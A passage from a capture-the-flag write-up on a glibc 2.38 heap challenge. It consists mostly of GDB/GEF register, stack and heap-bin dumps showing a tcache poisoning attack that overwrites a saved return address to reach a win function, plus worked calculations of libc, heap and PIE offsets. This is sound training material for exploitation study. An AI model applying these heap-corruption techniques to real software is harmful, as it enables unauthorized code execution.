   0x000055a27b9625d1 <+52>:    call   0x55a27b9620f0 <printf@plt>
   0x000055a27b9625d6 <+57>:    call   0x55a27b962304 <get_uint>
   0x000055a27b9625db <+62>:    mov DWORD PTR [rbp-0x10],eax
   0x000055a27b9625de <+65>:    cmp DWORD PTR [rbp-0x10],0x0
   0x000055a27b9625e2 <+69>:    je  0x55a27b962616 <edit_chunk+121>
   0x000055a27b9625e4 <+71>:    cmp DWORD PTR [rbp-0x10],0xfef
   0x000055a27b9625eb <+78>:    ja  0x55a27b962616 <edit_chunk+121>
   0x000055a27b9625ed <+80>:    mov eax,DWORD PTR [rbp-0x10]
   0x000055a27b9625f0 <+83>:    mov esi,eax
   0x000055a27b9625f2 <+85>:    lea rax,[rip+0xc98]     # 0x55a27b963291
   0x000055a27b9625f9 <+92>:    mov rdi,rax
   0x000055a27b9625fc <+95>:    mov eax,0x0
   0x000055a27b962601 <+100>:   call   0x55a27b9620f0 <printf@plt>
   0x000055a27b962606 <+105>:   call   0x55a27b962368 <get_chunk_idx>
   0x000055a27b96260b <+110>:   mov DWORD PTR [rbp-0xc],eax
   0x000055a27b96260e <+113>:   cmp DWORD PTR [rbp-0xc],0xffffffff
   0x000055a27b962612 <+117>:   je  0x55a27b962627 <edit_chunk+138>
   0x000055a27b962614 <+119>:   jmp 0x55a27b962638 <edit_chunk+155>
   0x000055a27b962616 <+121>:   lea rax,[rip+0xc8b]     # 0x55a27b9632a8
   0x000055a27b96261d <+128>:   mov rdi,rax
   0x000055a27b962620 <+131>:   call   0x55a27b9620d0 <puts@plt>
   0x000055a27b962625 <+136>:   jmp 0x55a27b962684 <edit_chunk+231>
   0x000055a27b962627 <+138>:   lea rax,[rip+0xbf3]     # 0x55a27b963221
   0x000055a27b96262e <+145>:   mov rdi,rax
   0x000055a27b962631 <+148>:   call   0x55a27b9620d0 <puts@plt>
   0x000055a27b962636 <+153>:   jmp 0x55a27b962684 <edit_chunk+231>
   0x000055a27b962638 <+155>:   mov eax,DWORD PTR [rbp-0xc]
   0x000055a27b96263b <+158>:   lea rdx,[rax*8+0x0]
   0x000055a27b962643 <+166>:   lea rax,[rip+0x29f6]        # 0x55a27b965040 <chunks>
   0x000055a27b96264a <+173>:   mov rax,QWORD PTR [rdx+rax*1]
   0x000055a27b96264e <+177>:   mov QWORD PTR [rbp-0x8],rax
   0x000055a27b962652 <+181>:   lea rax,[rip+0xc77]     # 0x55a27b9632d0
   0x000055a27b962659 <+188>:   mov rdi,rax
   0x000055a27b96265c <+191>:   call   0x55a27b9620d0 <puts@plt>
   0x000055a27b962661 <+196>:   mov edx,DWORD PTR [rbp-0x10]
   0x000055a27b962664 <+199>:   mov rax,QWORD PTR [rbp-0x8]
   0x000055a27b962668 <+203>:   mov rsi,rax
   0x000055a27b96266b <+206>:   mov edi,0x0
   0x000055a27b962670 <+211>:   call   0x55a27b962100 <read@plt>
   0x000055a27b962675 <+216>:   lea rax,[rip+0xc75]     # 0x55a27b9632f1
   0x000055a27b96267c <+223>:   mov rdi,rax
   0x000055a27b96267f <+226>:   call   0x55a27b9620d0 <puts@plt>
   0x000055a27b962684 <+231>:   leave  
   0x000055a27b962685 <+232>:   ret    
End of assembler dump.
gef➤  b *edit_chunk+206
Breakpoint 1 at 0x55a27b96266b
gef➤  b *edit_chunk+216
Breakpoint 2 at 0x55a27b962675
gef➤  c
Continuing.
```

So we see, we wrote the stack address `0x7fff800c04c8` to `chunks`, which is the stack return address of the `edit_chunk` function. Let's see us overwrite the saved stack return address, and call `you_win`:

```
Breakpoint 2, 0x000055a27b962675 in edit_chunk ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x8             
$rbx   : 0x0             
$rcx   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x8             
$rsp   : 0x00007fff800c04b0  →  0x0000000000000008
$rbp   : 0x00007fff800c04c0  →  0x00007fff800c04e0  →  0x0000000000000001
$rsi   : 0x00007fff800c04c8  →  0x000055a27b9622db  →  <you_win+0> endbr64
$rdi   : 0x0             
$rip   : 0x000055a27b962675  →  <edit_chunk+216> lea rax, [rip+0xc75]       # 0x55a27b9632f1
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007fff800c0247  →  0x007f7305c4f2b200
$r11   : 0x246           
$r12   : 0x00007fff800c05f8  →  0x00007fff800c1486  →  "./chall-01"
$r13   : 0x000055a27b962229  →  <main+0> endbr64
$r14   : 0x000055a27b964d78  →  0x000055a27b9621e0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f730606f020  →  0x00007f73060702e0  →  0x000055a27b961000  →   jg 0x55a27b961047
$eflags: [zero CARRY parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c04b0│+0x0000: 0x0000000000000008   ← $rsp
0x00007fff800c04b8│+0x0008: 0x00007fff800c04c8  →  0x000055a27b9622db  →  <you_win+0> endbr64
0x00007fff800c04c0│+0x0010: 0x00007fff800c04e0  →  0x0000000000000001   ← $rbp
0x00007fff800c04c8│+0x0018: 0x000055a27b9622db  →  <you_win+0> endbr64   ← $rsi
0x00007fff800c04d0│+0x0020: 0x0000000000000000
0x00007fff800c04d8│+0x0028: 0x0000000306057080
0x00007fff800c04e0│+0x0030: 0x0000000000000001
0x00007fff800c04e8│+0x0038: 0x00007f7305c23fbd  →  <__libc_start_call_main+109> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55a27b962668 <edit_chunk+203> mov  rsi, rax
   0x55a27b96266b <edit_chunk+206> mov  edi, 0x0
   0x55a27b962670 <edit_chunk+211> call   0x55a27b962100 <read@plt>
 → 0x55a27b962675 <edit_chunk+216> lea  rax, [rip+0xc75]        # 0x55a27b9632f1
   0x55a27b96267c <edit_chunk+223> mov  rdi, rax
   0x55a27b96267f <edit_chunk+226> call   0x55a27b9620d0 <puts@plt>
   0x55a27b962684 <edit_chunk+231> leave  
   0x55a27b962685 <edit_chunk+232> ret    
   0x55a27b962686 <free_chunk+0>   endbr64
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x55a27b962675 in edit_chunk (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55a27b962675 → edit_chunk()
[#1] 0x55a27b9622db → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  info frame
Stack level 0, frame at 0x7fff800c04d0:
 rip = 0x55a27b962675 in edit_chunk; saved rip = 0x55a27b9622db
 called by frame at 0x7fff800c04f0
 Arglist at 0x7fff800c04c0, args:
 Locals at 0x7fff800c04c0, Previous frame's sp is 0x7fff800c04d0
 Saved registers:
  rbp at 0x7fff800c04c0, rip at 0x7fff800c04c8
gef➤  x/g 0x55a27b9622db
0x55a27b9622db <you_win>:   0xe5894855fa1e0ff3
gef➤  b *you_win
Breakpoint 3 at 0x55a27b9622db
gef➤  c
Continuing.

Breakpoint 3, 0x000055a27b9622db in you_win ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x19            
$rbx   : 0x0             
$rcx   : 0x00007f7305cf53b4  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x0             
$rsp   : 0x00007fff800c04d0  →  0x0000000000000000
$rbp   : 0x00007fff800c04e0  →  0x0000000000000001
$rsi   : 0x000055a27cdee2a0  →  "\nChunk has been edited!\nontent:\n-0xff0:\nunk\n3[...]"
$rdi   : 0x00007f7305e2e8f0  →  0x0000000000000000
$rip   : 0x000055a27b9622db  →  <you_win+0> endbr64
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007fff800c0247  →  0x007f7305c4f2b200
$r11   : 0x202           
$r12   : 0x00007fff800c05f8  →  0x00007fff800c1486  →  "./chall-01"
$r13   : 0x000055a27b962229  →  <main+0> endbr64
$r14   : 0x000055a27b964d78  →  0x000055a27b9621e0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f730606f020  →  0x00007f73060702e0  →  0x000055a27b961000  →   jg 0x55a27b961047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c04d0│+0x0000: 0x0000000000000000   ← $rsp
0x00007fff800c04d8│+0x0008: 0x0000000306057080
0x00007fff800c04e0│+0x0010: 0x0000000000000001   ← $rbp
0x00007fff800c04e8│+0x0018: 0x00007f7305c23fbd  →  <__libc_start_call_main+109> mov edi, eax
0x00007fff800c04f0│+0x0020: 0x00007f730603b000  →  0x03010102464c457f
0x00007fff800c04f8│+0x0028: 0x000055a27b962229  →  <main+0> endbr64
0x00007fff800c0500│+0x0030: 0x00000001800c05e0
0x00007fff800c0508│+0x0038: 0x00007fff800c05f8  →  0x00007fff800c1486  →  "./chall-01"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55a27b9622cc <main+163>    mov eax, 0x0
   0x55a27b9622d1 <main+168>    call   0x55a27b9620f0 <printf@plt>
   0x55a27b9622d6 <main+173>    jmp 0x55a27b962235 <main+12>
 → 0x55a27b9622db <you_win+0>   endbr64
   0x55a27b9622df <you_win+4>   push   rbp
   0x55a27b9622e0 <you_win+5>   mov rbp, rsp
   0x55a27b9622e3 <you_win+8>   lea rax, [rip+0xd9c]        # 0x55a27b963086
   0x55a27b9622ea <you_win+15>  mov rdi, rax
   0x55a27b9622ed <you_win+18>  call   0x55a27b9620d0 <puts@plt>
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x55a27b9622db in you_win (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55a27b9622db → you_win()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000000 in ?? ()




[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xc             
$rbx   : 0x0             
$rcx   : 0x00007f7305cf53b4  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x0             
$rsp   : 0x00007fff800c04d8  →  0x0000000306057080
$rbp   : 0x00007fff800c04e0  →  0x0000000000000001
$rsi   : 0x000055a27cdee2a0  →  "\n\nYou Win\n\nunction to win!\nent:\n-0xff0:\nunk[...]"
$rdi   : 0x00007f7305e2e8f0  →  0x0000000000000000
$rip   : 0x0             
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007fff800c0247  →  0x007f7305c4f2b200
$r11   : 0x202           
$r12   : 0x00007fff800c05f8  →  0x00007fff800c1486  →  "./chall-01"
$r13   : 0x000055a27b962229  →  <main+0> endbr64
$r14   : 0x000055a27b964d78  →  0x000055a27b9621e0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007f730606f020  →  0x00007f73060702e0  →  0x000055a27b961000  →   jg 0x55a27b961047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c04d8│+0x0000: 0x0000000306057080   ← $rsp
0x00007fff800c04e0│+0x0008: 0x0000000000000001   ← $rbp
0x00007fff800c04e8│+0x0010: 0x00007f7305c23fbd  →  <__libc_start_call_main+109> mov edi, eax
0x00007fff800c04f0│+0x0018: 0x00007f730603b000  →  0x03010102464c457f
0x00007fff800c04f8│+0x0020: 0x000055a27b962229  →  <main+0> endbr64
0x00007fff800c0500│+0x0028: 0x00000001800c05e0
0x00007fff800c0508│+0x0030: 0x00007fff800c05f8  →  0x00007fff800c1486  →  "./chall-01"
0x00007fff800c0510│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x0
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x0 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Just like that, we see that we were able to call `you_win`! Afterwards, the code crashed.

Also, to cover how to get the offsets.

The offset to the libc base, which the value for this run is `0x7fd0d762d290`, which is the leak value we get from `libc_leak_val = u64(libc_leak + b"\x00"*2)`:

```
0x7fd0d762d290

 . . .

gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
 . . .
0x00007fd0d7400000 0x00007fd0d7422000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
 . . .

0x7fd0d762d290 - 0x00007fd0d7400000 = 0x22d290
```

The offset to the heap base, which the value for this run is `0x564276da9220`, which is the leak value we get from `heap_leak = view_chunk(2)`:

```
0x564276da9220

 . . .

gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
 . . .
0x0000564276da7000 0x0000564276dc8000 0x0000000000000000 rw- [heap]
 . . .

0x564276da9220 - 0x0000564276da7000 = 0x2220
```

The offset to the unsorted chunk next ptr, that we have to restore, after getting the heap infoleak. This is the value we get from `libc_fix_val = libc_base + 0x22cd00`:

```
gef➤  heap bins
─────────────────────────── Tcachebins for thread 1 ───────────────────────────
All tcachebins are empty
───────────────────── Fastbins for arena at 0x7f735342cca0 ─────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────── Unsorted Bin for arena at 0x7f735342cca0 ───────────────────
[+] unsorted_bins[0]: fw=0x55d711d24bf0, bk=0x55d711d24bf0
 →   Chunk(addr=0x55d711d24c00, size=0x5a0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
──────────────────── Small Bins for arena at 0x7f735342cca0 ────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────── Large Bins for arena at 0x7f735342cca0 ────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/g 0x55d711d24c00
0x55d711d24c00: 0x00007f735342cd00
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
 . . .
0x00007f7353200000 0x00007f7353222000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
 . . .

 0x00007f735342cd00 - 0x00007f7353200000 = 0x22cd00
```

The offset from our PIE infoleak to the the PIE base. This is the leak value we get from `pie_leak = view_chunk(8)`:

```
0x5587c85f4711

 . . .

gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00005587c85f3000 0x00005587c85f4000 0x0000000000000000 r-- /Hackery/shogun/challs/01/chall-01
 . . .

0x5587c85f4711 - 0x00005587c85f3000 = 0x1711
```

Next up, we need the offset from the start of the PIE base to the `you_win` function:

```
gef➤  p you_win
$1 = {<text variable, no debug info>} 0x561ed8a482db <you_win>
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000561ed8a47000 0x0000561ed8a48000 0x0000000000000000 r-- /Hackery/shogun/challs/01/chall-01
 . . .

0x561ed8a482db - 0x0000561ed8a47000 = 0x12db
```

Lastly, for the tcache primtiive, we will need the address of the tcache chunk which we will be overwriting the next ptr for:

```
gef➤  heap bins
─────────────────────────── Tcachebins for thread 1 ───────────────────────────
Tcachebins[idx=7, size=0x90, count=3] ←  Chunk(addr=0x55c42d18b260, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55c42d18b2f0, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x55c42d18b380, size=0x90, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) 
───────────────────── Fastbins for arena at 0x7f2c3f22cca0 ─────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────── Unsorted Bin for arena at 0x7f2c3f22cca0 ───────────────────
[+] unsorted_bins[0]: fw=0x55c42d18b400, bk=0x55c42d18b400
 →   Chunk(addr=0x55c42d18b410, size=0x330, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
──────────────────── Small Bins for arena at 0x7f2c3f22cca0 ────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────── Large Bins for arena at 0x7f2c3f22cca0 ────────────────────
[+] large_bins[69]: fw=0x55c42d18abf0, bk=0x55c42d18abf0
 →   Chunk(addr=0x55c42d18ac00, size=0x5a0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in 1 large non-empty bins.
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
 . . .
0x000055c42d189000 0x000055c42d1aa000 0x0000000000000000 rw- [heap]
 . . .

0x55c42d18b260 - 0x000055c42d189000 = 0x2260
```

The last offset we will need, is the stack offset, but finding that is the same as the `00` chall.
